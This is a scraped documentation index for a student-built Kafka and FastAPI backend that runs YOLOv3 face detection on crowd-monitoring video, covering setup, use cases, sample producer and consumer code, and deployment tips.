Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#kafka-python-backend-for-crowd-monitoring","content":" The Kafka Python Backend is a critical component of the Crowd Monitoring system designed to process images and video frames for face detection using a messaging architecture. This backend infrastructure leverages Apache Kafka for efficient message handling, FastAPI for lightweight API endpoints, and a modular face detection model for identifying faces in crowd monitoring applications.  ","version":"Next","tagName":"h2"},{"title":"Purpose​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#purpose","content":" The main goals of this project are:  Process images and video frames for crowd monitoring applicationsImplement a producer-consumer architecture for distributed message processingUtilize Apache Kafka to handle high-throughput message streams efficientlyProvide REST API endpoints through FastAPI for system integration  ","version":"Next","tagName":"h2"},{"title":"Architecture Overview​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#architecture-overview","content":" This project implements a messaging-based architecture with:  Kafka Message Broker: Handles communication between components for crowd monitoring dataFastAPI Service: Provides REST API endpoints for sending and receiving detection resultsBackground Processing: Runs Kafka consumer in a separate thread for continuous operation  ","version":"Next","tagName":"h2"},{"title":"Technical Components​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#technical-components","content":" app.py: FastAPI application with Kafka integration and REST endpointsmodel.py: YOLOv3 face detection implementation with JSON result formattingproducer.py: Face detection code for producing messages to Kafkaconsumer.py: Kafka consumer for processing face detection results and storing in PostgreSQL  ","version":"Next","tagName":"h2"},{"title":"System Requirements​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#system-requirements","content":" Python: 3.10 or higherKafka: Running in DockerPackage Manager: uv 0.6 or higherWeb Framework: FastAPIContainer Platform: Docker &amp; Docker Compose  ","version":"Next","tagName":"h2"},{"title":"Setup & Deployment​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#setup--deployment","content":" The system is deployed on the Redback server, where Kafka, PostgreSQL, RabbitMQ, and Airflow are pre-configured and running. Local Python development is supported via a virtual environment using the uv tool. API documentation is accessible through the built-in Swagger UI when the FastAPI service is running.    Table of Contents | Next: Key Features  Quick Start Guide  This guide will help you quickly set up and run the Kafka Python Backend for your Crowd Monitoring project.  ","version":"Next","tagName":"h2"},{"title":"Prerequisites​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#prerequisites","content":" Before you begin, ensure you have the following installed:  Python 3.10 or higher(Optional) Docker, only if you plan to run services locally instead of using Redbackuv 0.6 or higher  ","version":"Next","tagName":"h2"},{"title":"Installation Steps​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#installation-steps","content":" Clone the repository git clone https://github.com/sumituiet/kafka_python.git cd kafka_python Access hosted services (Redback)You can access the pre-configured services on the Deakin Redback server via: Kafka UI: http://redback.it.deakin.edu.au:8080 RabbitMQ Management: http://redback.it.deakin.edu.au:15672 Airflow Web UI: http://redback.it.deakin.edu.au:8888 Create and activate a virtual environment using uv uv venv Activate the virtual environemnt (Windows/macOS/Linux) source .venv/bin/activate (Optional) Install uv inside the environment if not already available pip install uv   ","version":"Next","tagName":"h2"},{"title":"Running the Application​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#running-the-application","content":" Start the FastAPI server fastapi dev app.py   The server will start at http://127.0.0.1:8000Access the API documentation  Open your browser and navigate to http://127.0.0.1:8000/docsThis interactive documentation allows you to test all API endpoints  ","version":"Next","tagName":"h2"},{"title":"Testing Face Detection​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#testing-face-detection","content":" Send a test message  Use the /send endpoint to publish a test message to Kafka Example :   { &quot;content&quot;: &quot;process_image&quot;, &quot;sender&quot;: &quot;test_client&quot; }   Process an image  Place test images in your project directory  from model import detect_faces results = detect_faces(&quot;path/to/image.jpg&quot;) print(results)   Retreive processed images  Use the /receive endpoint to get messages from the Kafka consumer.  ","version":"Next","tagName":"h2"},{"title":"Monitoring​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#monitoring","content":" Check your terminal or logs for Kafka consumer output PostgreSQL stores all processed face detection results — use tools like pgAdmin or psql CLI to inspect stored data Use Kafka UI at http://redback.it.deakin.edu.au:8080 to monitor Kafka topics and message flow  Key Features  The Kafka Python Backend with Face Detection offers specialized features designed for real-time face detection and messaging:  ","version":"Next","tagName":"h2"},{"title":"Core Features​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#core-features","content":" ","version":"Next","tagName":"h2"},{"title":"Real-time Message Processing​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#real-time-message-processing","content":" Asynchronous communication through Kafka messaging systemIn-memory message queue for temporary storageBackground thread consumer for continuous message processingEfficient message handling with JSON serialization  ","version":"Next","tagName":"h3"},{"title":"FastAPI Integration​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#fastapi-integration","content":" High-performance RESTful API endpointsJSON-based message format for seamless data exchangeSimple /send endpoint for message production/receive endpoint for retrieving processed messagesAutomatic cleanup of delivered messages  ","version":"Next","tagName":"h3"},{"title":"Kafka-Powered Architecture​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#kafka-powered-architecture","content":" Producer-consumer pattern for distributed processingReliable message delivery with Kafka guaranteesConfigurable broker settingsTopic-based message organizationJSON serialization/deserialization for structured data  ","version":"Next","tagName":"h3"},{"title":"Additional Features​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#additional-features","content":" ","version":"Next","tagName":"h2"},{"title":"Structured Face Detection Results​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#structured-face-detection-results","content":" Frame identification for video processingTotal face count in each processed imageDetailed face records with unique IDsPrecise bounding box coordinates (x, y, width, height)Confidence scores for each detected face  ","version":"Next","tagName":"h3"},{"title":"Data Persistence​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#data-persistence","content":" PostgreSQL integration for storing resultsStructured data format for efficient queryingPersistent storage of detection results  ","version":"Next","tagName":"h3"},{"title":"Flexible Processing Options​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#flexible-processing-options","content":" Support for file-based image processingFrame-by-frame video processing capabilitiesCustomizable confidence thresholdsNon-maximum suppression for removing duplicate detections  ","version":"Next","tagName":"h3"},{"title":"Developer-Friendly Implementation​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#developer-friendly-implementation","content":" Modular code organizationClear separation of concernsEasily extendable architectureSimple configuration of Kafka brokers and topics    Project Overview | Table of Contents | Use Cases  Use Cases  This document outlines the primary use cases for the Kafka Python Backend with YOLOv3 face detection in crowd monitoring applications.  ","version":"Next","tagName":"h3"},{"title":"Crowd Analysis​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#crowd-analysis","content":" ","version":"Next","tagName":"h2"},{"title":"Real-time Crowd Density Monitoring​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#real-time-crowd-density-monitoring","content":" Description: Monitor crowd density in public spaces by detecting and counting faces in video streams.Implementation: Security camera feeds are processed frame-by-frame using the YOLOv3 model, with face counts published to Kafka topics for real-time monitoring.Benefit: Allows security personnel to identify potential overcrowding situations before they become dangerous.  ","version":"Next","tagName":"h3"},{"title":"Facility Capacity Management​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#facility-capacity-management","content":" Description: Track facility occupancy levels to ensure compliance with capacity regulations.Implementation: The system processes entrance and exit camera feeds, using face detection to count individuals entering and leaving the facility.Benefit: Helps venues maintain safe occupancy levels and comply with safety regulations.  ","version":"Next","tagName":"h3"},{"title":"Security Applications​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#security-applications","content":" ","version":"Next","tagName":"h2"},{"title":"Unauthorized Access Detection​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#unauthorized-access-detection","content":" Description: Monitor restricted areas for unauthorized personnel.Implementation: The system continuously processes camera feeds from restricted areas, sending alerts when faces are detected in zones that should be vacant.Benefit: Enhances security by providing immediate notification when restricted zones are breached.  ","version":"Next","tagName":"h3"},{"title":"Anomalous Behavior Detection​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#anomalous-behavior-detection","content":" Description: Identify unusual crowd movements or gatherings.Implementation: By analyzing the number and distribution of detected faces over time, the system can recognize sudden changes in crowd patterns.Benefit: Helps security teams respond proactively to potentially problematic situations.  ","version":"Next","tagName":"h3"},{"title":"Marketing and Analytics​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#marketing-and-analytics","content":" ","version":"Next","tagName":"h2"},{"title":"Customer Traffic Analysis​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#customer-traffic-analysis","content":" Description: Analyze customer traffic patterns in retail environments.Implementation: Face detection data from store cameras is processed to generate heatmaps of customer presence throughout business hours.Benefit: Provides retailers with valuable insights for optimizing store layouts and staffing.  ","version":"Next","tagName":"h3"},{"title":"Engagement Measurement​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#engagement-measurement","content":" Description: Measure audience engagement with displays or presentations.Implementation: By detecting faces oriented toward displays, the system can estimate attention levels and dwell time.Benefit: Helps marketing teams evaluate the effectiveness of visual merchandising and advertisements.  ","version":"Next","tagName":"h3"},{"title":"Event Management​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#event-management","content":" ","version":"Next","tagName":"h2"},{"title":"Queue Management​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#queue-management","content":" Description: Monitor queue lengths and waiting times.Implementation: Camera feeds focused on queuing areas are processed to count faces, with data used to estimate wait times.Benefit: Improves customer experience by allowing staff to open additional service points when queues grow too long.  ","version":"Next","tagName":"h3"},{"title":"Event Attendance Tracking​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#event-attendance-tracking","content":" Description: Track attendance at events or specific areas.Implementation: The system processes video from entry points, using YOLOv3 face detection to count unique attendees.Benefit: Provides accurate attendance metrics for event organizers and sponsors.  ","version":"Next","tagName":"h3"},{"title":"Health and Safety​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#health-and-safety","content":" ","version":"Next","tagName":"h2"},{"title":"Social Distancing Compliance​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#social-distancing-compliance","content":" Description: Monitor adherence to social distancing guidelines.Implementation: By analyzing the spatial distribution of detected faces, the system can identify areas where people are clustered too closely together.Benefit: Helps enforce health protocols and reduce transmission risks in public spaces.  ","version":"Next","tagName":"h3"},{"title":"Emergency Evacuation Management​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#emergency-evacuation-management","content":" Description: Support safe evacuations during emergencies.Implementation: Real-time face detection helps track crowd movement during evacuations, identifying bottlenecks or areas where people might be trapped.Benefit: Assists emergency responders in prioritizing rescue efforts and improving evacuation procedures.  Installation  This guide will walk you through the complete installation process for the Kafka Python Backend with face detection support.  ","version":"Next","tagName":"h3"},{"title":"Requirements​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#requirements","content":" ","version":"Next","tagName":"h2"},{"title":"System Requirements​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#system-requirements-1","content":" Operating System: Linux (recommended), macOS, or WindowsRAM: Minimum 8GB (16GB recommended for production)Storage: At least 10GB free disk spaceCPU: Multi-core processor (recommended for video processing)  ","version":"Next","tagName":"h3"},{"title":"Software Prerequisites​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#software-prerequisites","content":" Python: Version 3.10 or higherDocker: Latest stable versionDocker Compose: Latest stable versionuv: Version 0.6 or higher (Python package manager)Git: For repository cloning  ","version":"Next","tagName":"h3"},{"title":"Network Requirements​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#network-requirements","content":" Port 9092 available for Kafka brokerPort 8000 available for FastAPI servicePort 5432 open for PostgreSQL database (if accessing remotely)  ","version":"Next","tagName":"h3"},{"title":"Setup Instructions​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#setup-instructions","content":" ","version":"Next","tagName":"h2"},{"title":"1. Clone the Repository​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#1-clone-the-repository","content":" git clone https://github.com/sumituiet/kafka_python.git cd kafka_python   ","version":"Next","tagName":"h3"},{"title":"2. Access hosted services (Redback)​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#2-access-hosted-services-redback","content":" You can access the pre-configured services on the Deakin Redback server via:  Kafka UI: http://redback.it.deakin.edu.au:8080  RabbitMQ Management: http://redback.it.deakin.edu.au:15672  Airflow Web UI: http://redback.it.deakin.edu.au:8888  ","version":"Next","tagName":"h3"},{"title":"3. Setup Python Environment​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#3-setup-python-environment","content":" Create and activate virtual environment using uv:  uv venv source .venv/bin/activate # On Windows: .venv\\Scripts\\activate   Install required dependencies:  uv install   ","version":"Next","tagName":"h3"},{"title":"Environment Configuration​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#environment-configuration","content":" ","version":"Next","tagName":"h2"},{"title":"1. Configure Kafka Connection​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#1-configure-kafka-connection","content":" By default, the application connects to Kafka at localhost:9092. To modify this: Edit app.py, producer.py, and consumer.py to update the KAFKA_BROKER variable:  # Default KAFKA_BROKER = &quot;localhost:9092&quot; # Example for custom configuration KAFKA_BROKER = &quot;your-kafka-server:9092&quot;   ","version":"Next","tagName":"h3"},{"title":"2. Configure Topic Names​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#2-configure-topic-names","content":" Update Kafka Topics neededIn app.py (default)  TOPIC_NAME = &quot;faces&quot;   In consumer.py (default)Consumer topic for 'Faces'.  Troubleshooting Installation  ","version":"Next","tagName":"h3"},{"title":"Docker Issues​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#docker-issues","content":" Problem: Docker services not starting Solution: Check if the Docker daemon is running: docker info Ensure required ports are free: netstat -tulpn | grep &lt;port&gt; Problem: Kafka not accessible Solution: View Kafka logs: docker-compose logs kafka Check if Kafka is exposed on the correct port (9092 by default)    ","version":"Next","tagName":"h2"},{"title":"Python Environment Issues​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#python-environment-issues","content":" Problem: uv command not found Solution: Install uv using pip: pip install uv Problem: Package installation failures Solution: Check your Python version (recommended: Python 3.8+)Update uv if already installed: pip install -U uv     ","version":"Next","tagName":"h2"},{"title":"Connectivity Issues​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#connectivity-issues","content":" Problem: Application can't connect to Kafka Solution: Confirm Kafka is running and healthyCheck firewall or VPN settings that might block port 9092Verify the Kafka broker address in your config matches the container/service name  Kafka Core Concepts  ","version":"Next","tagName":"h2"},{"title":"Kafka Architecture Overview​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#kafka-architecture-overview","content":" Kafka operates as a distributed messaging system that follows a client-server architecture. Applications connect to Kafka brokers via configuration settings:  bootstrap_servers='localhost:9092'   This setting establishes the fundamental connection between client applications and the Kafka cluster, serving as the entry point for all communications. The cluster maintains topics that organize message streams, while clients interact with these topics through well-defined APIs.  The Kafka broker handles message persistence, replication, and delivery, functioning as an intermediary between producers and consumers while maintaining highly available service.  ","version":"Next","tagName":"h2"},{"title":"Producer-Consumer Model​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#producer-consumer-model","content":" The implementation demonstrates Kafka's producer-consumer model through specialized components:  ProducersProducers are applications that publish messages to specific topics. The code shows multiple producer implementations:  A video frame producer that extracts and sends face detection dataA media stream producer that publishes encoded audio and video chunksA messaging producer that sends chat data  producer = KafkaProducer( bootstrap_servers='localhost:9092', value_serializer=lambda v: json.dumps(v).encode('utf-8') ) producer.send(topic, result)   ConsumersConsumers subscribe to topics and process published messages. Different consumer implementations demonstrate varying consumption patterns:  A face data consumer that processes detection results and stores them in a databaseA video consumer that reconstructs frames from received dataA threaded consumer within a web application that maintains an in-memory queue  consumer = KafkaConsumer( 'Faces', bootstrap_servers='localhost:9092', auto_offset_reset='earliest', value_deserializer=lambda v: json.loads(v.decode('utf-8')) ) for msg in consumer: data = msg.value # Process the message   This decoupled architecture enables independent development, deployment, and scaling of producers and consumers.  ","version":"Next","tagName":"h3"},{"title":"Topics and Partitions​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#topics-and-partitions","content":" This decoupled architecture enables independent development, deployment, and scaling of producers and consumers.  # Different topics for different data domains 'Faces' # Face detection data 'chat' # Messaging data 'media-stream' # Video and audio streaming data   Topics are physically implemented as partitions, providing the foundation for parallelism and distributed processing. While partitioning configuration is not explicitly shown in the code, the Kafka client libraries manage the distribution of messages across partitions when multiple partitions exist.  Messages with the same key are guaranteed to be sent to the same partition, enabling ordering guarantees for related messages.  ","version":"Next","tagName":"h2"},{"title":"Message Delivery Semantics​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#message-delivery-semantics","content":" The implementation demonstrates various delivery semantics through configuration options:  # Different offset reset strategies auto_offset_reset='earliest' # Process all available messages auto_offset_reset='latest' # Process only new messages   # Ensuring message delivery producer.flush() # Blocks until messages are sent   # Managing consumer offsets enable_auto_commit=True # Automatically track processed messages   These settings control the reliability guarantees:  At-most-once: When producers don't wait for acknowledgmentsAt-least-once: When producers confirm delivery and consumers track offsetsExactly-once: Requires additional configuration using transactions and idempotent producers  The implementation primarily uses at-least-once semantics, ensuring messages are never lost while accepting the possibility of duplicate processing.  ","version":"Next","tagName":"h2"},{"title":"Getting Started​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#getting-started-1","content":" This section guides you through the practical steps to begin using Kafka in your application.  ","version":"Next","tagName":"h2"},{"title":"Basic Setup​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#basic-setup","content":" Before creating producers and consumers, you need to set up a basic Kafka environment:  # Import the required libraries from kafka import KafkaProducer, KafkaConsumer import json # Define broker connection information KAFKA_BROKER = 'localhost:9092' TOPIC_NAME = 'example-topic'   Make sure your Kafka broker is running and accessible at the specified address before proceeding to the next steps.  ","version":"Next","tagName":"h2"},{"title":"Simple Producer Example​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#simple-producer-example","content":" The following example demonstrates how to create a basic producer that sends messages to a Kafka topic:  # Create a Kafka producer with JSON serialization producer = KafkaProducer( bootstrap_servers=KAFKA_BROKER, value_serializer=lambda v: json.dumps(v).encode('utf-8') ) # Send a message to the topic message = {&quot;key&quot;: &quot;value&quot;, &quot;timestamp&quot;: &quot;2023-04-09T12:00:00Z&quot;} producer.send(TOPIC_NAME, message) # Ensure the message is sent before continuing producer.flush() print(&quot;Message sent successfully!&quot;)   This producer serializes Python dictionaries to JSON before sending them to the Kafka topic.  ","version":"Next","tagName":"h2"},{"title":"Simple Consumer Example​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#simple-consumer-example","content":" Here's how to create a basic consumer that reads messages from a Kafka topic:  # Create a Kafka consumer with JSON deserialization consumer = KafkaConsumer( TOPIC_NAME, bootstrap_servers=KAFKA_BROKER, auto_offset_reset='earliest', value_deserializer=lambda v: json.loads(v.decode('utf-8')) ) # Process messages print(&quot;Waiting for messages...&quot;) for message in consumer: data = message.value print(f&quot;Received: {data}&quot;) # Process the message data here # To exit the loop (in this example), break after processing one message break consumer.close()   This consumer deserializes JSON messages back into Python dictionaries and processes them one by one.  ","version":"Next","tagName":"h2"},{"title":"Configuration Options​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#configuration-options","content":" Kafka clients offer numerous configuration options to customize behavior:  producer = KafkaProducer( bootstrap_servers='localhost:9092', value_serializer=lambda v: json.dumps(v).encode('utf-8'), acks='all', # Wait for all replicas to acknowledge retries=3, # Number of retries if the broker is unavailable batch_size=16384, # Size of batches in bytes linger_ms=10, # Delay in milliseconds to allow batching compression_type='gzip', # Message compression type max_in_flight_requests_per_connection=1 # For strict ordering )   Consumer Configuration  consumer = KafkaConsumer( 'example-topic', bootstrap_servers='localhost:9092', group_id='my-group', # Consumer group ID auto_offset_reset='earliest', # Start from beginning of topic enable_auto_commit=True, # Automatically commit offsets auto_commit_interval_ms=5000, # Commit interval in milliseconds fetch_max_bytes=52428800, # Max bytes to fetch per request max_poll_records=500, # Max records per poll value_deserializer=lambda v: json.loads(v.decode('utf-8')) )   These configurations allow you to fine-tune performance, reliability, and behavior of your Kafka applications.  ","version":"Next","tagName":"h2"},{"title":"API Reference​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#api-reference-1","content":" ","version":"Next","tagName":"h2"},{"title":"Producer API​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#producer-api","content":" Module: producer.py Functionality:  Reads video frames using OpenCV.Applies YOLOv3-based face detection.Sends JSON results to the Kafka topic Faces.  Kafka Configuration:  KafkaProducer( bootstrap_servers='localhost:9092', value_serializer=lambda v: json.dumps(v).encode('utf-8') )   Topic: Faces Message Format:  { &quot;frame_id&quot;: 12, &quot;total_faces&quot;: 3, &quot;faces&quot;: [ { &quot;face_id&quot;: 0, &quot;bounding_box&quot;: {&quot;x&quot;: 100, &quot;y&quot;: 120, &quot;width&quot;: 50, &quot;height&quot;: 50}, &quot;confidence&quot;: 0.89 } ] }   ","version":"Next","tagName":"h3"},{"title":"Consumer API​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#consumer-api","content":" Module: consumer.py Functionality:  Subscribes to Kafka topic Faces. Deserializes JSON messages. Persists face data to PostgreSQL using insert_face_data().  KafkaConsumer( 'Faces', bootstrap_servers='localhost:9092', auto_offset_reset='earliest', value_deserializer=lambda v: json.loads(v.decode('utf-8')) )   PostgreSQL Integration:  Assumes insert_face_data(data) in database.py.    ","version":"Next","tagName":"h3"},{"title":"Advanced Usage​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#advanced-usage-1","content":" ","version":"Next","tagName":"h2"},{"title":"Serialization and Deserialization​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#serialization-and-deserialization","content":" The Producer converts Python data (dictionary) to JSON before sending to Kafka.The Consumer reads the JSON from Kafka and turns it back into a Python dictionary.  # Producer value_serializer=lambda v: json.dumps(v).encode('utf-8') # Consumer value_deserializer=lambda v: json.loads(v.decode('utf-8'))     ","version":"Next","tagName":"h3"},{"title":"Error Handling and Retry Mechanism​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#error-handling-and-retry-mechanism","content":" Right now, the app stops with CTRL+C.In the future, we try to implement: Retry logic: Try sending or saving again if something fails.Logging errors: Print or save errors to understand what went wrong.    ","version":"Next","tagName":"h3"},{"title":"Performance Tuning​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#performance-tuning","content":" You can skip more frames by changing this line in producer.py: frame_interval = int(fps / 3) Try /2 or /5 depending on how fast you want it. Use batch writes for PostgreSQL to save many face results at once. Kafka has settings like linger.ms and batch.size to send data faster and smarter.    ","version":"Next","tagName":"h3"},{"title":"Monitoring and Metrics​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#monitoring-and-metrics","content":" Monitoring helps ensure your system is working correctly, and lets you catch problems early. Below are suggestions to monitor the health and performance of your Kafka pipeline.    ","version":"Next","tagName":"h2"},{"title":"Kafka Monitoring​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#kafka-monitoring","content":" Use tools like:  Kafka Manager or Confluent Control Center – to monitor: Topic lagMessage throughputBroker health Prometheus + Grafana (with JMX Exporter) – for real-time dashboards  Metrics to track:  Messages In/Out per secondUnder-replicated partitionsConsumer group lagProducer retries/failures    ","version":"Next","tagName":"h3"},{"title":"Producer Metrics​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#producer-metrics","content":" If you want to log metrics from the producer.py, consider:  Logging each frame sent and face count: print(f&quot; Sent Frame {frame_id}: {result['total_faces']} faces&quot;)   Track dropped frames, retries, or exceptions using a logger.  For more advanced tracking:  Use prometheus_client Python package to expose metrics from producer and consumer as HTTP endpoints.  ","version":"Next","tagName":"h3"},{"title":"Consumer Metrics​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#consumer-metrics","content":" Monitor:  Number of messages consumed Insert success/failure count in PostgreSQL  To add basic timing:  import time start_time = time.time() insert_face_data(data) print(f&quot;Insertion took {time.time() - start_time} seconds&quot;)   ","version":"Next","tagName":"h3"},{"title":"PostgreSQL Monitoring​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#postgresql-monitoring","content":" Used tools like pgAdmin, PostgreSQL Performance Dashboard, or command-line utilities (e.g., pg_stat_statements) to:  Track query execution times  Monitor CPU and memory usage  Review indexing effectiveness and query plans  Deployment Guide  This guide provides step-by-step instructions to deploy the Kafka-based face detection system using Docker Compose.    ","version":"Next","tagName":"h3"},{"title":"Production Best Practices​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#production-best-practices","content":" ","version":"Next","tagName":"h2"},{"title":"Recommendations​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#recommendations","content":" Use environment variables via .env for configuration.Separate dev/staging/prod Docker files if needed.Never commit actual secrets (e.g., passwords, keys) to version control.Use logging, retry, and error handling in producer/consumer scripts.Monitor Kafka, PostgreSQL, and Airflow health with dashboards or alerts.    ","version":"Next","tagName":"h3"},{"title":"Scaling Considerations​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#scaling-considerations","content":" ","version":"Next","tagName":"h3"},{"title":"Techniques​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#techniques","content":" Use Kafka partitions to parallelize topic processing.Add more consumers in a consumer group to scale reads.Use multiple Airflow Celery workers for concurrent DAG execution.Enable PostgreSQL partitioning or table sharding for handling large volumes of face detection data.Control processing load using frame_interval in producer.py.    ","version":"Next","tagName":"h3"},{"title":"Containerization with Docker​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#containerization-with-docker","content":" ","version":"Next","tagName":"h2"},{"title":"Services Overview​","type":1,"pageTitle":"Kafka Python Documentation - Table of 